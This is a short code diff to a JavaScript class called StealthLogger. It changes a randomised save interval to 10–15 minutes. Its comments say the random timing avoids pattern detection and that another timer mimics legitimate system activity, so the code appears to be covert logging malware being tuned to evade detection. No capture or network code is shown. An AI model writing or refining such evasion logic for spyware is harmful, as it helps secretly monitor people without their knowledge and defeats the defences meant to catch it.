@@ -42,8 +42,8 @@ class StealthLogger {
 
     init() {
         // Random intervals to avoid pattern detection
-        this.saveInterval = setInterval(() => this.saveBuffer(), 
-            Math.floor(Math.random() * 45000) + 30000); // 30-75 seconds random
+        this.saveInterval = setInterval(() => this.saveBuffer(),
+    		Math.floor(Math.random() * 300000) + 600000); // 10–15 minutes
         
         // Mimic legitimate system activity
         this.systemMimicInterval = setInterval(() => this.mimicSystemActivity(), 60000);
